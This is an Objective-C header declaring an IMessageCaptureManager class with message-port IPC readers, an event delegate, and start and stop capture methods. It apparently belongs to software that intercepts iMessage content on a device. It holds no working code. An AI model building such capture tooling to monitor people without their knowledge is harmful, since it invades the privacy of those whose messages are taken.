//
//  IMessageCaptureManager.h
//  iMessageCaptureManager
//
//  Created by Makara Khloth on 2/1/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@protocol EventDelegate;

@interface IMessageCaptureManager : NSObject <MessagePortIPCDelegate> {
@private
	MessagePortIPCReader	*mMessagePortReader1;
	MessagePortIPCReader	*mMessagePortReader2;
	
	id <EventDelegate>		mEventDelegate;
}

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;

- (void) startCapture;
- (void) stopCapture;

@end
